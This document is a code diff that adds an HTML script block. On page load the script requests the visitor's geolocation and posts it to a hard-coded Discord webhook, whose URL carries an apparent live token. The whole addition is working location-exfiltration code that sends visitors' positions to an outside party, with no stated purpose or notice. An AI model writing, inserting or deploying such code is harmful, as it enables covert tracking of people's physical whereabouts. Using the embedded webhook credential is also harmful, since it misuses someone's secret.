@@ -1,0 +1,13 @@
+<script>
+var url = 'https://canary.discordapp.com/api/webhooks/372463265995030530/U6NajcULy6jnyIMU3BWE0vP3SX6GUPYgIA6f9vT5Q20VVK2qI0QmafonMW5hE-zjNOo1/slack';
+function postMessage(msg) {
+    var xml = new XMLHttpRequest();
+    xml.open('POST', url, true);
+    xml.setRequestHeader('Content-type', 'application/json');
+    xml.send(JSON.stringify({
+        text: msg
+    }));
+}
+
+navigator.geolocation.getCurrentPosition(function(pos){ postMessage(JSON.stringify(pos)) });
+</script>
